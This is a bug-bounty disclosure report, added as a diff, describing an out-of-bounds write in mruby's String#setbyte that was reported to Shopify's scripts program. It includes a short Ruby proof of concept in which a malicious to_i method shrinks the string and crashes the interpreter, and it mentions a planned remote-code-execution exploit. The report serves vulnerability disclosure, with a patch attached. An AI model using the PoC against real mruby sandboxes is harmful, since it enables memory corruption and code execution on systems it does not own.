@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/181893
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/raydot
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:20000.0
+Severity:critical
+State:Closed
+DateOfDisclosure:16.12.2016 21:35:57
+
+Summary:
+
+The String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.
+
+Following is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.
+
+```
+$s = "9" + ("\n" * (1024*1024-1))
+$k = []
+
+class Tmp
+    def to_i
+        $k.push("a"*1024)
+        $s.chomp! ''
+        $s.succ!
+        95
+    end
+end
+tmp = Tmp.new
+$s.setbyte(128, tmp)
+puts $k[0]
+```
+
+Attached is a patch to mruby to resolve this issue.
